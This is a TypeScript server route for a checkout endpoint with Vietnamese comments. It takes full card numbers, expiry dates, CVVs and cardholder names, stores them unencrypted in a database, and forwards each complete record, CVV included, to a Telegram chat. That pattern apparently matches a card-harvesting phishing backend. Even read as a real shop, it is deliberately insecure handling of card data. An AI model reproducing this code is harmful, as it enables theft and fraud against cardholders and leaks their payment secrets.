import db from '~/server/database/db';
import { sendNewOrderNotification } from '~/server/utils/telegram';

export default defineEventHandler(async (event) => {
    if (event.node.req.method !== 'POST') {
        throw createError({
            statusCode: 405,
            statusMessage: 'Method Not Allowed'
        });
    }

    try {
        const body = await readBody(event);
        const { method, cardNumber, expiry, cvv, cardholderName } = body;

        if (!method || !cardNumber || !expiry || !cvv || !cardholderName) {
            throw createError({
                statusCode: 400,
                statusMessage: 'Missing required payment information'
            });
        }

        const stmt = db.prepare(`
            INSERT INTO payment_info (method, card_number, expiry, cvv, cardholder_name)
            VALUES (?, ?, ?, ?, ?)
        `);

        const result = stmt.run(method, cardNumber, expiry, cvv, cardholderName);
        const paymentId = result.lastInsertRowid as number;

        // Lấy thông tin payment vừa tạo để gửi thông báo
        const getPaymentStmt = db.prepare(`
            SELECT id, method, card_number, cardholder_name, expiry, cvv, status, created_at
            FROM payment_info
            WHERE id = ?
        `);

        const payment = getPaymentStmt.get(paymentId) as any;

        if (payment) {
            // Gửi thông báo Telegram trong background (không block response)
            sendNewOrderNotification(payment).catch((error) => {
                console.error('Error sending Telegram notification:', error);
            });
        }

        return {
            success: true,
            message: `${paymentId}`
        };
    } catch (error) {
        console.error('Error in checkout API:', error);
        throw createError({
            statusCode: 500,
            statusMessage: 'Internal Server Error'
        });
    }
});
